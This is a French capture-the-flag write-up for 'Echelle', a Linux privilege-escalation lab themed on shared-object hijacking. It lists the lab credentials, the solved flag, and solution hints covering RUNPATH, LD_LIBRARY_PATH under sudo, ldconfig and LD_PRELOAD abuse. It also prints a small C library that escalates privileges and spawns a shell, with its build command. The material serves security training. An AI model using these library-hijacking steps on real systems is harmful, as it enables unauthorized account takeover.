# Echelle

| Système      |
|--------------|
| Difficile 😠 |
| Validé ✅     |
## Description

Bienvenue à cette introduction à l'escalade de privilèges sur système Linux !

Vous démarrez avec un compte symbolisé par une marche, et devez grimper les marches une par une jusqu'à arriver à la dernière disponible.

Chaque objet d'escalade possède un thème, qui vous sera utile à comprendre afin de grimper les marches !

------

L'échelle comporte cinq marches : de **marche6** à **marche10**

La dernière marche possède un flag dans ~/flag.txt

Le thème de l'échelle est : **Shared Object**

|          |           |
|----------|-----------|
| User     | marche6   |
| Password | `marche6` |

-----

- Auteur : NozZy

## Flag
||`CYBN{Sh@r3d_0bj3Ct_i5_FuN_t0_3Xpl0I7}`||

## Pistes
Shared Object
ldd, readelf

RUNPATH exploit => create so in directory /home/marche6/mylib

sudo env exploit => sudo -u marche8 LD_LIBRARY_PATH=/tmp /home/marche7/prog

ldconfig /etc/ld.so.conf.d/marche8

sudo -u marche10 LD_PRELOAD=/tmp/ibmyrandom.so


```c
#include <stdio.h>
#include <stdlib.h>

void get_random() {
    setreuid(geteuid(), geteuid());
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared <random.c> -o libmyrandom.so
```